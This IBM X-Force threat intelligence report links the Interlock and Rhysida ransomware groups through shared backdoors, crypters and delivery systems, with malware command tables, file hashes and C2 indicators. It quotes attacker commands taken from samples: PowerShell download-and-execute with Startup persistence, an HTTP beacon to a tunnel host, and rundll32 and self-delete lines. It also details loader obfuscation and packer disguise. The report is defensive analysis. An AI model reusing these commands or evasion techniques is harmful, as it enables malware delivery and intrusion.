---
title: Interlock and Rhysida within the ransomware ecosystem
author: Golo Mühr
url: https://www.ibm.com/think/x-force/interlock-and-rhysida-within-the-ransonware-ecosystem
hostname: ibm.com
description: IBM X-Force uncovers deep links between Interlock and Rhysida ransomware actors, detailing shared malware, crypters, and infrastructure across the ecosystem, with insights into infection chains, initial access brokers, and evolving tools over two years of analysis.
sitename: Interlock and Rhysida within the ransomware ecosystem
date: "2026-06-12"
tags: ['Threat intelligence', 'IBM X-Force', 'Cybersecurity', 'Threat management']
fingerprint: ace489398537a293
language: en
image: https://www.ibm.com/content/dam/worldwide-content/stock-assets/getty/image/photography/ab/e5/1240_1.jpg/_jcr_content/renditions/cq5dam.web.1280.1280.jpeg
pagetype: website
filedate: "2026-11-25"
---
Published 12 June 2026

Today, IBM X-Force is releasing long-term research on the ransomware ecosystem surrounding Interlock and Rhysida. This research highlights over two years’ worth of observations on various malware families and crypters and has been correlated with extensive third-party reporting. The following report analyzes links between initial-access brokers (IABs), crypters, downloaders and backdoor malware used by Rhysida and Interlock ransomware actors.

- [Hive0163](https://www.ibm.com/think/x-force/slopoly-start-ai-enhanced-ransomware-attacks#Threat+actor+Hive0163) (Interlock) is a highly capable ransomware group. They employ a large variety of mostly custom malware including NodeSnake, InterlockRAT, JunkFiction downloader, Supper (aka SocksShell), Interlock ransomware and JunkFiction crypter.

- The research identified links between Interlock and TAG-124 (aka Landupdate808, KongTuke).

- For their operations, Rhysida actors often use Endico downloader, Broomstick (aka Oyster or CleanUpLoader), Supper, and Tomb crypter (aka Textshell or pkr\_mtsi). Several links also suggest a relationship with IceNova (aka Latrodectus) operators and [ITG23](https://www.ibm.com/think/x-force/itg23-crypters-cooperation-between-cybercriminal-groups).

- X-Force further discovered strong overlaps between NodeSnake, JunkFiction downloader, InterlockRAT and Supper malware variants, indicating a shared original codebase or possibly common developers.

- Analysis of post‑exploitation payloads discovered on Interlock staging servers highlights the group’s broad and adaptable toolset.

Since September 2024, Hive0163, aka the Interlock ransomware group, has conducted ransomware operations. The group does not appear to operate as a Ransomware-as-a-Service (RaaS) and demonstrates a versatile initial-access and post-exploitation toolset. The most common malware families employed by the group include NodeSnake, InterlockRAT, Supper, JunkFiction downloader, and their own custom ransomware encryptor (both Windows and Linux versions).

Unlike Interlock, Rhysida has run as a RaaS since at least May 2023. One of the associated threat actors responsible for Rhysida ransomware attacks, tracked by Microsoft as Vanilla Tempest, frequently relies on the malware families Supper, Broomstick and Endico downloader.

According to their data leak sites, Interlock and Rhysida have claimed around 80 victims each in 2025, with the majority located in the US. The following sectors were among the most impacted for each of the groups:

Public reporting has speculated on connections between the two groups. [Cisco Talos](https://blog.talosintelligence.com/emerging-interlock-ransomware/) assessed, with low confidence, that “Interlock ransomware is likely a new diversified group that emerged from Rhysida ransomware operators or developers, based on some similarities in the operators’ tactics, techniques, and procedures (TTPs) and in the ransomware encryptor binaries”. The following sections discuss the malware families and infection chains of both groups, and detail further evidence of relationships between their malware developers and operators.

The following graph provides an overview of relevant infection chains and crypting observations. These malware relationships were predominantly constructed from single-stage infection observations. Threat intelligence vendors are credited wherever their reporting served as the primary source. Malware families with color-coded markers indicate that they were found crypted by the corresponding crypter.

Relationships deducted from the graph above largely rely on the assumption that the malware is not broadly commoditized. Based on long-term tracking of malware samples, X-Force assesses with medium to high confidence that the malware families discussed here are more likely exclusive to a comparatively small number of users or affiliates.

However, depending on the malware, there may be different degrees of exclusivity. Some groups might only use in-house developed malware themselves, and others may sell access or share source code with a select number of other groups. The same is true for crypters, because advanced groups often rely on internal or external specialized crypting providers who develop and maintain exclusive crypters. These are often significantly more effective than commoditized and publicly advertised crypting services.

IABs facilitate initial infections via their own operations and may sell their access to ransomware operators. [Microsoft](https://x.com/MsftSecIntel/status/1836456417315656076), for instance, observed Gootloader (Hive0127, Storm-0494) handing off access to Vanilla Tempest to load the Supper backdoor before deploying INC ransomware in September 2024. In November 2025, [Huntress documented similar observations](https://www.huntress.com/blog/gootloader-threat-detection-woff2-obfuscation) where Gootloader infections lead to Tomb-crypted Supper backdoor samples. According to [Guidepoint](https://www.guidepointsecurity.com/blog/interesting-interlock-intrusion-how-interlock-achieves-encryption/), Interlock ransomware was also deployed through initial access likely facilitated by SocGholish in January 2025, which led to what appears to be the NodeSnake downloader.

Another important enabler for these ransomware attacks are traffic distribution systems (TDS). These allow operators to redirect victims from an infected site to the right malicious target based on their browser data and a custom logic. Then, the redirection target may display a credential phishing site or serve malicious payloads. These can occur through fake downloads or via ClickFix-style attacks. Interlock-related infections have consistently been tied to one TDS in particular, tracked by [Recorded Future](https://assets.recordedfuture.com/insikt-report-pdfs/2025/cta-2025-0130.pdf) as TAG-124 (overlapping with LandUpdate808 and KongTuke):

- [Recorded Future](https://assets.recordedfuture.com/insikt-report-pdfs/2025/cta-2025-0130.pdf) linked a September 2024 JunkFiction downloader campaign to TAG-124, which was associated with an Interlock ransomware incident documented by [Cisco Talos](https://blog.talosintelligence.com/emerging-interlock-ransomware/).

- [Fortinet](https://www.fortinet.com/blog/threat-research/interlock-ransomware-new-techniques-same-old-tricks) observed a likely TAG-124 ClickFix-based MintLoader infection leading to NodeSnake and backdoor samples X-Force identifies as the Supper backdoor, in an Interlock ransomware incident in March 2025.

- [DFIR Report](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/) in partnership with Proofpoint published analysis on a ClickFix-style infection served through LandUpdate808 (aka KongTuke) web-injects leading to NodeSnake in May-June 2025.

Additional published evidence, based on shared victims and observed network communication, may even suggest a stronger relationship between Interlock operators and TAG-124 (see [VB paper by Julian-Ferdinand Vögele](https://www.virusbulletin.com/uploads/pdf/conference/vb2025/papers/Unmasking-TAG-124-dissecting-a-prevalent-traffic-distribution-system-in-the-cybercriminal-ecosystem.pdf)).

Notably, before Interlock was first active, the TDS had also been used to distribute Dave-crypted Broomstick by Rhysida actors in May 2024, according to [Recorded Future](https://assets.recordedfuture.com/insikt-report-pdfs/2025/cta-2025-0130.pdf).

Several other public reports have documented infections where no connection has been made to a specific IAB or TDS like TAG-124/KongTuke/Landupdate808. The following campaigns used the same ClickFix-based phishing or trojanized installers downloaded from fake websites as initial access vectors:

- [Beazley Security Labs](https://labs.beazley.security/articles/hunting-mice-in-tunnels-ii-fake-captchas-and-ransomware) reported on malware, X-Force identifies as JunkFiction downloader, used to deploy the JunkFiction-crypted Supper backdoor in an Interlock-linked incident in November 2024.

- [Microsoft](https://x.com/MsftSecIntel/status/1981780375115297226) disrupted a Vanilla Tempest campaign involving trojanized installers with the Tomb-crypted Endico downloader resulting in Tomb-crypted Broomstick samples to ultimately deploy Rhysida ransomware in September 2025.

- [Expel](https://expel.com/blog/certified-oysterloader-tracking-rhysida-ransomware-gang-activity-via-code-signing-certificates/) reporting included the same Vanilla Tempest campaign as Microsoft, and through shared code-signing certificates further discovered what X-Force identifies as Dave-crypted IceNova (aka Latrodectus, BLACKWIDOW) and Supper likely used in adjacent initial access campaigns.

- [X-Force](https://www.ibm.com/think/x-force/slopoly-start-ai-enhanced-ransomware-attacks) published a report on a ClickFix-based infection leading to NodeSnake, InterlockRAT, and the Interlock ransomware in early 2026.

Lastly, in a [March 2026 report](https://aws.amazon.com/blogs/security/amazon-threat-intelligence-teams-identify-interlock-ransomware-campaign-targeting-enterprise-firewalls/), Amazon threat intelligence documented an Interlock intrusion exploiting [CVE-2026-20131](https://nvd.nist.gov/vuln/detail/cve-2026-20131), demonstrating the group’s ability to exploit network edge devices to achieve initial access.

X-Force analyzed over a dozen malware variants associated with the activity above and identified strong relationships between several malicious backdoors, indicating a common developer or shared code base. NodeSnake and InterlockRAT are strongly related with shared code and are often found within the same infection chain. NodeSnake acts as the initial downloader and InterlockRAT serves as a full backdoor with a reverse shell and SOCKS5 proxy capabilities. In addition, the Supper backdoor was identified as a strongly related code family, because it is effectively just a different implementation of InterlockRAT. Both have clients developed in C/C++, JavaScript and Java.

Unlike NodeSnake and InterlockRAT, a slightly larger group of operators have access to Supper. During Interlock and Rhysida ransomware incidents, the malware was crypted using JunkFiction and Tomb, their respective preferred crypters. Supper was also observed, as a second stage, to the Broomstick (aka Oyster, CleanUpLoader) backdoor ([Deception.Pro](https://blog.deception.pro/blog/oyster-vidar-hok-dec2025)), JunkFiction downloader ([Beazley Security Labs](https://labs.beazley.security/articles/hunting-mice-in-tunnels-ii-fake-captchas-and-ransomware)) and NodeSnake ([Esentire](https://www.esentire.com/blog/unmasking-interlock-groups-evolving-malware-arsenal), [Fortinet](https://www.fortinet.com/blog/threat-research/interlock-ransomware-new-techniques-same-old-tricks)). [CERT Polska](https://cert.pl/en/posts/2026/02/fake-captcha-in-action/) also reported finding Supper crypted with the late-2025 variant of the [ITG23 Dave crypter](https://www.ibm.com/think/x-force/itg23-crypters-cooperation-between-cybercriminal-groups) within an incident involving IceNova.

In January 2026, [Huntress](https://www.huntress.com/blog/malicious-browser-extention-crashfix-kongtuke) reported on a new malware called ModeloRAT, distributed by KongTuke. X-Force identified several code similarities between ModeloRAT and NodeSnake. Further overlaps discussed below are similarities between NodeSnake and the JunkFiction downloader, as well as a self-deletion technique shared by the Supper backdoor and Interlock ransomware.

During all stages of the kill chain, from initial access malware to later-stage post-exploitation, crypters and downloaders play an important role to deliver critical payloads. A crypter is a builder used by threat actors to conceal their final payload (often through encryption and compression) within a second binary, known as a loader or stub. This is an executable often featuring complex anti-analysis and endpoint detection and response (EDR) evasion techniques, whose objective is to decrypt and execute its embedded payload. To avoid detection and analysis, crypters need to undergo constant development, which makes a good crypting provider highly valuable to cybercriminals. A downloader may behave in a very similar way, with the only difference that the payload is retrieved from a remote server rather than from within its own binary.

The presence of a known private crypter on a malware sample is a strong indicator that its distributor or operator has a relationship with the provider/developer of that crypter. By tracking all payloads crypted by certain crypters, researchers can partially reconstruct the relationships of these specialized crypting providers and their clients, which are often prominent cybercrime groups. The same principle applies to downloaders.

X-Force has consistently tracked crypters for several years, especially the [TrickBot/Conti crypters](https://www.ibm.com/think/x-force/trickbot-conti-crypters-where-are-they-now), attributed to ITG23. Dave, a crypter active since at least 2020 and previously used on Emotet, TrickBot, IcedID, Conti and Ryuk, has continued to evolve and is actively used on malware including Broomstick, IceNova and Supper. However, in comparison to other crypters, Dave has become a much rarer observance. Most infection chains from X-Force visibility and public reporting show that Rhysida and Interlock actors appear to prefer the following distinct crypter and downloader combinations:

| Malware type | Interlock | Vanilla Tempest | 
| Downloader | NodeSnake, JunkFiction downloader | Endico | 
| Crypter | JunkFiction | Tomb | 
| Backdoor | InterlockRAT, Supper | Broomstick, Supper | 
| Ransomware | Interlock | Rhysida, INC and possibly others | 

Note that [according to Microsoft](https://x.com/MsftSecIntel/status/1836456406276342215), the same operators using the malware combinations Endico, Tomb, Broomstick and Supper (tracked as Vanilla Tempest) previously also deployed INC ransomware.

X-Force identified notable similarities between the malware families NodeSnake, InterlockRAT and Supper. These suggest some form of lineage from a shared original codebase, or a common team of developers. These malware variants are still under active development and come in various different implementations of their backdoor clients including PHP, Java, Javascript, C/C++ and support both Windows and Linux environments.

NodeSnake is a malware that was first identified in January 2025. Although it is a persistent backdoor, it mainly functions as a downloader for second stage malware such as InterlockRAT or Supper. [Google Threat Intelligence](https://cloud.google.com/blog/topics/threat-intelligence/analyzing-cornflake-v3-backdoor/) tracks NodeSnake as CORNFLAKE.

Since the initial versions, as documented by [Quorum Cyber](https://www.quorumcyber.com/wp-content/uploads/2025/06/20250416-Higher-Education-Sector-RAT.pdf), multiple additional commands have been added. The latest observed version currently supports the following commands:

| ID | Name | Functionality | 
|---|---|---|
| 0 | EXE | Downloads and executes a .EXE payload | 
| 1 | DLL | Downloads and executes a .DLL payload | 
| 2 | JS | Downloads and executes a JavaScript payload | 
| 3 | SHELL\_COMMAND | Runs a shell command, and returns the results | 
| 4 | ACTIVE | Parses delay and timeout values and changes beacon intervals | 
| 5 | AUTORUN | Establishes persistence on the infected device (depends on OS) | 
| 6 | OFF | The malware exits its own process | 
| 7 | UPDATE | The malware updates itself | 
| 8 | SCREENSHOT | Takes a screenshot and sends it to the C2 server | 

The latest addition is the screenshot command observed in NodeJS variants, which installed the “screenshot-desktop” module via **npm** to take the screenshot.

On first execution NodeSnake gathers system and environment information into a JSON object to register with its C2 server.

Apart from the collected data, the C2 registration data includes a version build, a generated bot ID, the privilege level of the executing process, the type of C2 client (JS in this case) and a vendor ID. The latter indicates that the NodeSnake C2 framework might be used with different affiliates identified by their vendor IDs. Thus far, X-Force has only identified vendor IDs “0x0” and “0x2b”. The C2 communication data is compressed and encrypted in HTTP POST requests to randomized URL patterns. Both NodeSnake and InterlockRAT use very similar JavaScript implementations and have been observed contacting the same C2 servers which are stored as a list of hardcoded IP addresses and domains.

X-Force identified the following recent NodeSnake versions and builds:

| Platform | Version | Hash | 
|---|---|---|
| NodeJS (Windows) | 0x24 | 705127c9730dcdebfa0f30103952107098d164d1941c400ea1f3ff454951c225 | 
| NodeJS (Windows) | 0x23 | 082a6286953c0f4256751f1c9bf4c06d4c14fc63f601a78e2f70f7ebd42821cb | 
| NodeJS (Linux) | 0x23 | ea1a0bb1bc5eb31b85675dc91370ee26a8bc6571b0c21a8fc5faa58e67fa01ac | 
| NodeJS (Windows) | 0x21 | 85b8522ab6252a67c812bcfbe3adce392ce715b14cdeaf34d5102d3634d69433 | 
| PHP (Windows) | 0x21 | 28a9982cf2b4fc53a1545b6ed0d0c1788ca9369a847750f5652ffa0ca7f7b7d3 | 
| NodeJS (Windows) | 0x1E | ec90465dbe3e2846be394bc2d76ddffdee4834086bcc65a6f43535f51333a7d5 | 
| PHP (Linux) | 0x1E | 27091704a872d9ebbbc3b4273a365b1fcc8dee36e1e8a7b53f6df017a26812ff | 

While the Windows versions use the registry subkeys of **HKCU\Software\Microsoft\Windows\CurrentVersion\Run** for persistence, the Linux variants create **new systemd** services to survive reboots.

Between November 2024 and February 2025, X-Force analyzed a series of campaigns. These campaigns, also documented by [Sekoia](https://blog.sekoia.io/interlock-ransomware-evolving-under-the-radar/), used ClickFix and trojanized installers to download and run a Python script bundled as an executable via PyInstaller. In November, these bundled the JunkFiction downloader (c24cb7692b77123387b821f3683966807662217a4c918c32bb97358729c33a1d) as a payload within a PyInstaller sample (f962e15c6efebb3c29fe399bb168066042b616affddd83f72570c979184ec55c). These samples match the timeframe and reporting on the initial Interlock-linked infection reported by [Beazley Security Labs](https://labs.beazley.security/articles/hunting-mice-in-tunnels). Interestingly, a few months later, the actor changed the PyInstaller payloads (7890b116d13a52efe696ce1e2c0ed83029775cf4bea836ce551e71d222ee116f), which then contained a compiled Python script to download NodeJS and execute the embedded NodeSnake JavaScript payload.

In some cases, the same C2 servers were used in both NodeSnake and JunkFiction downloader campaigns (Ex: **65.109.226\[.\]176**). They also contact the same URL paths “/init1234” within the same timeframe and contain highly similar logic, which supports our theory that NodeSnake and JunkFiction downloader are related as well.

In January 2026, [Huntress](https://www.huntress.com/blog/malicious-browser-extention-crashfix-kongtuke) analyzed a new Python-based backdoor malware called ModeloRAT. It was deployed by KongTuke exclusively to domain-joined machines, which indicates its appetite to compromise larger enterprise networks. X-Force discovered several interesting code similarities between NodeSnake and ModeloRAT.

Looking at the system data exfiltrated in JSON format, ModeloRAT appears to be extending the original NodeSnake structure (Fig. 4):

When comparing the commands supported by ModeloRAT, they clearly overlap with those used by NodeSnake, supporting EXE, DLL and JS/PY payloads, direct shell commands, modification of timeout intervals, persistence, self-update and termination.

The most striking overlap is the use of the same magic bytes used as validation {FE FE 00 01}.

Both NodeSnake and ModeloRAT encrypt their network traffic using RC4 and validate the decrypted data with this specific byte sequence. If the sequences don’t match, NodeSnake displays an ‘Invalid version decrypt’ error, while ModeloRAT displays ‘Invalid version key.’

In May 2026, [Rapid7](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise/) published analysis on a ModeloRAT infection originating from a fake Microsoft Teams message. The actors also leveraged a privilege escalation exploit for CVE-2023-36036, which is highly similar to the implementation X-Force discovered on one of the Interlock staging servers in early 2026. Another tool described in the Rapid7 blog, faking a lock screen to phish the users local credentials, is also somewhat like the local phishing tool using a fake update found on the same Interlock staging server.

The fact that both ModeloRAT and NodeSnake were deployed by TAG-124/KongTuke, possessed overlaps with other malware families belonging to the Interlock toolkit and used the same exploit during their operations, supports the theory that these activities may be linked.

InterlockRAT is one of the fully-fledged backdoors observed as an immediate second stage to NodeSnake. Strong implementation overlaps and identical C2 servers make it likely part of the same framework. InterlockRAT’s core functionality includes spawning a reverse shell and establishing a SOCKS5 tunnel to facilitate stealthy post-compromise activity. Among the observed variants are C++ implementations compiled for different Windows and Linux architectures, as well as Java and JavaScript.

C2 communication is encrypted and performed via web socket tunnels. The following commands are supported in the current C2 client version 4:

| ID | Name | Functionality | 
|---|---|---|
| 0x5 | SOCKS5 | Establish SOCKS5 tunnel in new thread | 
| 0x6 | SLEEP | Set new sleep interval | 
| 0x7 | DISCONNECT | Disconnect a SOCKS5 tunnel from the server | 
| 0xB | OFF | The malware exits its own process | 
| 0xC | DELETE | The malware deletes itself | 
| 0x21 | FILE\_GET\_SOCKS | Read data from SOCKS5 tunnel | 
| 0x22 | FILE\_PUT\_SOCKS | Write data to SOCKS5 tunnel | 
| 0xA0 | TERMINAL | Setup reverse shell in new thread | 
| 0xA1 | TERMINAL\_COMMAND | Execute single shell command and return the results | 
| 0xE0 | UPDATE | The malware updates itself | 
| 0xF0 | INITIALIZE | Not implemented | 
| 0xFF | PING | Send a single beacon | 

Similar to NodeSnake, the backdoor begins by collecting basic system information in JSON format to register with its C2 server:

The following different versions and builds have been identified:

| Platform | Version | Hash | 
|---|---|---|
| Java | 4 | 7d13460fb3a6c918bd9866e1209fbcd18603304c35240f22571c432c204dc363 | 
| NodeJS | 4 | dea7885448e9a75ab45bd0b08a01f548c37e7d012cd519c4b8a85941d359e26b | 
| Linux x86-64 | 4 | b46a3f9a7917a0b0e08979f85c90ff802a3e96d23a19a8727d9d701d5e2088eb | 
| NodeJS | 3 | ff664520f263e30ee0380e496328a93701576f1312d2e33a70297a228a8a49a6 | 
| Java | 2 | 21d9ed48d51a5b5edae7eb7f99d1648a3ce7d419bc46234143c37dec4638c60d | 
| DLL (JunkFiction-crypted) | 2 | 396eb0e817d90cf366b5648f9a97c51bfb37737af13dc4a9e1a768885a867dc5 | 
| NodeJS | 2 | 690b6cf4205248a3fc5521762c69a24f46958e57621dc97b031e41ec1f381221 | 
| Linux x86-64 | 2 | 4fa8d9a20ce9098eddc065cc427e3ccb035bf3306e236c17a67104d79ca040e0 | 
| Linux ARM x64 | 2 | 9a0b069640a404939e48af5acec26c922bae44a8fdf26444f20ee4f7989640bc | 

X-Force observed post-compromise activity involving domain enumeration and lateral movement mainly through RDP sessions initiated through an InterlockRAT reverse shell, which made them appear as local RDP logins.

Supper (aka SocksShell or WINDYTWIST) is a backdoor first seen in [July 2024](https://malpedia.caad.fkie.fraunhofer.de/details/win.supper), making it older than the earliest observance of InterlockRAT and NodeSnake. Quite notably these first samples were crypted with JunkFiction, which is now the primary crypter used by Interlock operators on their tooling. Supper’s functionality is strikingly similar to InterlockRAT, despite being an inherently different implementation. The focus lies on persistent access via reverse shells, as well as the ability to create SOCKS5 tunnels. Later Supper variants further support receiving new C2 IP addresses and saving them to disk.

Both backdoors begin by collecting basic system information, formatted in similar JSON objects (or equivalent C structures):

Unlike InterlockRAT, Supper prepends the magic bytes **0xDF691155 to** its initial beacon. While InterlockRAT uses a string such as “JS” to identify the client implementation in their “type\_file” field, Supper uses an integer. Analysis of both Java implementations shows that they belong to the same structure, found in both samples:

InterlockRAT typically relies on RC4 to encrypt C2 communication. On the other hand, Supper decrypts initial responses via a single-byte XOR with 0x4D, to reveal a 12-byte struct containing a second 4-byte key used in a rolling XOR algorithm to receive further data:

Further similarities between Supper and InterlockRAT can be found in how the initial response from the C2 server is treated. Both malware families exit when receiving the code “2” and additionally self-delete in the case of code “1”.

Previous versions of Supper used an interesting self-deletion technique, by dropping and executing an embedded DLL (c9920e995fbc98cd3883ef4c4520300d5e82bab5d2a5c781e9e9fe694a43e82f) with a single export “run”, passing its own filename as an argument. The DLL’s export essentially just calls the *remove()* API from **msvcrt.dll**, which deletes Supper from disk. Interestingly, the [Interlock ransomware](https://www.ibm.com/think/x-force/slopoly-start-ai-enhanced-ransomware-attacks#Interlock+ransomware) makes use of the same embedded DLL if executed with the self-delete command line option “-del”. More recent versions of Supper have transitioned to using the following command line to self-delete:

```
cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q "<file_path>"  
```
Supper uses the following internal names for its commands which have been found in various versions, although not every command might be implemented. Each command is mapped to an ID, and value called “byte”, which is rarely used but maps back to the corresponding command ID of InterlockRAT in some cases:

| ID | Byte | Name | Functionality | 
|---|---|---|---|
| 0x0 | 0x5 | SOCKS5 | Establishes a SOCKS5 proxy connection | 
| 0x1 | 0x2 | VOID | No action, used for regular C2 check-in | 
| 0x2 | 0x7 | DISCONNECT | Disconnect the proxy connection | 
| 0x3 | 0xA | CONSOLE | Start a reverse shell | 
| 0x4 | 0xB | OFF | Terminate itself | 
| 0x5 | 0xC | DELETE | Delete itself from disk | 
| 0x6 | 0xD | NEW\_LAYING | Receive new C2 server IPs and save to disk | 
| 0x7 | 0xE | MV\_LAYING | Update primary C2 IP address | 
| 0x8 | 0xF | SLEEP | Set new Sleep interval | 
| 0x9 | 0x10 | CONSOLE\_ONE\_COMMAND | Execute single command | 
| 0xA | 0x0 | UNKNOWN | Not implemented | 

Despite their strong similarities, X-Force recognizes these malware families as two distinct implementations with different usages among ransomware operators. The Supper backdoor appears to be more widely used, in both Rhysida and Interlock incidents. On the other hand, InterlockRAT has only been observed, by X-Force, in Interlock incidents.

Different ransomware operators tend to prefer a specific trusted crypting provider to protect their tooling against detection. As expected with a malware framework that is either shared or sold to different operators, X-Force is tracking several different crypters used with compiled Supper samples:

| Description | Hash | 
|---|---|
| Dave-crypted Supper | 2528df60e55f210a6396dd7740d76afe30d5e9e8684a5b8a02a63bdcb5041bfc | 
| JunkFiction-crypted Supper | b1444193923ca6f71c70c6a45011378ef00459c8a0795da6e1637ef74a24facb | 
| Tomb-crypted Supper | a4d0ea40eb9cdcd2da83afbe4d36a634ac85c2cb6d16a83729791cadfeb1f298 | 
| Supper JS variant | c8347069980e0c7b8d42cbf0f2be7bc6e558f8b6cf7ca960f6454926120adf55 | 
| Supper JAR variant | 7ed805c5fc3bd0a4eab3d523483a9cc83b8768ff667875f2318f3bfa4ef68fe2 | 

JunkFiction is a malware family heavily used by Interlock ransomware operators (Hive0163). While this malware has been observed primarily operating as a loader, a downloader variant of the malware has also been spotted. The first samples date back to May 2024, and the downloader variant was first seen in September 2024. Both samples likely originated from the same developer. Code similarities between JunkFiction downloader and NodeSnake indicate a strong relationship between both malware families, which serve as the initial foothold in compromised environments, before deploying backdoors for post-compromise activity.

The crypter was observed on several different payloads including Berserk Stealer, Interlock Ransomware, Mallard Downloader, Plus Keylogger, NtlmThief, PortStarter, Supper and SystemBC.

Upon execution, the loader starts by decrypting its payload, stored in one of the data sections, using XOR and a 4-byte or 8-byte key which is prepended to the payload data.

Next, it decompresses the payload using the Zlib v1.3.1 inflate algorithm. In some versions of the loader, chunks of the code are encrypted and prior to performing decompression, the loader loops through a list of pointers to the encrypted chunks and decrypts each one using XOR and a single byte key (e.g., **0xD0**).

JunkFiction uses the VirtualProtect API to set the permissions of the memory holding its own image to PAGE\_EXECUTE\_READWRITE. The loader then maps the payload PE into this memory space, overwriting its own image. For this to not result in the currently executing loader code being overwritten, the JunkFiction loader binary contains junk code functions exceeding the size of the payload PE, with any critical functions located after that point. As a result, when the payload is mapped over the loader PE, it only overwrites the junk functions and not the critical ones containing the loader code.

Once the payload is mapped, JunkFiction loads its required imports, executes any TLS callback functions, and then transfers execution to the payload’s entrypoint.

JunkFiction Loader samples implement an interesting code obfuscation/anti-analysis technique.

The main loader code is split into small chunks and each chunk is prepended to the start of an obfuscated junk function, just prior to the function’s prologue. In each case, the address of the next chunk of loader code is pushed onto the stack as the return address such that when the junk function finishes executing it will return to the address of the next chunk of loader code.

This technique serves firstly to break the malicious code up such that small blocks of malicious instructions are separated by large chunks of benign, junk code, making it more difficult for security applications to detect the malicious functionality. Secondly, it operates as an anti-analysis mechanism as it may lead reverse-engineers to waste time attempting to analyse the obfuscated junk functions. Additional effort and patching of the binary may be necessary to properly reconstruct and decompile the loader function.

The JunkFiction downloader was specifically designed to be used as a trojanized installer. While it gathers basic system information and downloads a malicious payload, it also downloads the legitimate installer it masks as to avoid raising suspicion. [Beazley Security Labs](https://labs.beazley.security/articles/hunting-mice-in-tunnels) tracks the JunkFiction downloader as “Dormouse”.

Initial versions of the downloader (43f4ca1c7474c0476a42d937dc4af01c8ccfc20331baa0465ac0f3408f52b2e2) used the same obfuscation as the loader. The malware starts by decrypting its configuration, which is xor-encrypted and stored in the .data section of the PE. The configuration block includes strings and commands used by the malware, C2 IP addresses, and import names, which the malware proceeds to load in the next step.

Then the downloader creates a new process to execute a PowerShell command designed to download and run an executable named **MicrosoftEdgeSetup.exe** from the domain **https\[:\]//apple-online\[.\]shop/.**

```
powershell.exe -Command "Invoke-WebRequest -Uri \"https://apple-online[.]shop/MicrosoftEdgeSetup.exe\" -OutFile \"$env:TMP/MicrosoftEdgeSetup.exe\" ; & \"$env:TMP/MicrosoftEdgeSetup.exe\""  
```
This appears to be a signed, legitimate Microsoft Edge binary and is likely used as a smokescreen for the downloader’s subsequent activities. Depending on the campaign, the malware may download different files, however in each case they appear to be legitimate installers.

```
https://apple-online[.]shop/ChromeSetup.exe 
https://apple-online[.]shop/MSTeamsSetup.exe 
```
In some later variants of the malware, the PowerShell command has been extended to include the creation of a shortcut file within the Startup folder to establish persistence. In the below example, a shortcut file named **thrndfg.lnk** is created within **%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\**. The target of the shortcut is the downloader binary.

```
powershell.exe -Command "Invoke-WebRequest -Uri \"https://apple-online.shop/MSTeamsSetup.exe\" -OutFile \"$env:TMP/MSTeamsSetup.exe\" ; 
& \"$env:TMP/MSTeamsSetup.exe\" ; $startupFolder = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup') ; 
$programPath = '<downloader_path>' ; $shortcutName = 'thrndfg.lnk' ; $shortcutPath = [System.IO.Path]::Combine($startupFolder, $shortcutName) ; 
$WshShell = New-Object -ComObject WScript.Shell ; $shortcut = $WshShell.CreateShortcut($shortcutPath) ; $shortcut.TargetPath = $programPath ; 
$shortcut.WorkingDirectory = [System.IO.Path]::GetDirectoryName($programPath) ; $shortcut.Save()"] 
```
Next the downloader executes the **systeminfo** command and reads the results into a buffer.

```
cmd.exe /c systeminfo 
```
The downloader writes the bytes **{fb fb fa fa}** to the start of the buffer, followed by 2-bytes containing a hardcoded integer (e.g. 1 or 4), the purpose of which is currently unknown, and lastly the results of the **systeminfo** command.

In newer variants of the downloader, the initial bytes are replaced by the result of the **rdtsc** command, and a hardcoded 5-digit mission ID is also included in the buffer. The contents of the buffer are also encrypted using XOR before being sent.

The downloader then opens a TCP connection to one of its configured C2 addresses (randomly selected) and sends the buffer containing the collected system info. If the connection fails, then it tries another IP address.

In later variants, the downloader connects to its C2 via HTTP instead of TCP, and the buffer containing the system information is sent via HTTP POST request. In many of these samples the C2 domain is set to a TryCloudflare tunnel. These variants are highly similar to the NodeSnake malware discussed above.

```
POST /init1234 HTTP/1.1\r\n 
Host: muscle-european-entering-bigger.trycloudflare.com\r\n 
Connection: keep-alive\r\n 
Content-Type: application/octet-stream\r\n 
Content-Length: %d\r\n 
<encrypted_data> 
```
If the connection to the C2 succeeds, then the downloader reads 4-bytes from the response. If the value is -1 the malware exits. Otherwise, it interprets the value as the size of the remaining data and proceeds to read the rest of the response.

It then decrypts the received data using XOR and a single-byte key and drops the decrypted file to the **%TEMP%** directory using a randomly generated filename.

The malware then creates a new process to execute the dropped file. The last byte of the received data indicates whether the file is an executable or DLL; if it is an executable then the downloader executes it directly, otherwise if it is a DLL the malware executes it using the following command:

```
rundll32.exe <file_path>,rundll 
```
Notably, the latest versions of JunkFiction abandoned the original obfuscation, and have become much simpler, likely for evasion purposes. After downloading the legitimate installer, from the official site in these versions, they only run a short PowerShell script to send system information to the C2 server and execute the response as PowerShell (097f139304307375cd41bb2dc3913166e9f05f0d6bf5aad1efdc081dbf07c68d).

Tomb is a crypter/packer X-Force discovered in January 2024 when it was initially used to load Broomstick and Rhysida ransomware. Since then, the crypter has undergone several significant updates. Around April 2025, a second stage was added to load the shellcode stub which was previously Tomb v1. This version, Tomb v2, is also tracked as “pkr\_mtsi” by [ReversingLabs](https://www.reversinglabs.com/blog/unpacking-pkr_mtsi) and as “TextShell” by [Huntress](https://www.huntress.com/blog/gootloader-threat-detection-woff2-obfuscation).

Tomb combines elements of both a crypter and a UPX packer. The packed binary contains a UPX-style PE header, however the standard UPX-section names, UPX0 and UPX1, have been replaced by the more mundane section names **.text** and **.data**, likely to avoid being identified by signature-based detectors. After the PE header, the binary contains a UPX-style header followed by the payload data. The UPX header has been similarly stripped down and modified to disguise identifiable features. The UPX magic signature, “UPX!”, has been replaced by the bytes **{91 ff 01 05}**, and several of the header fields have been filled with null bytes. An example can be seen in the image below.

In this example, we can see the magic signature **{91 ff 01 05}** followed by 16 null bytes. In a standard UPX sample it would contain values for the version, format, method, level fields, the two adler32 hash values and the uncompressed length. After that, we have 12 bytes representing the remaining fields. These fields still retain their values, namely the compressed length, original file size, filter-related fields and the header checksum.

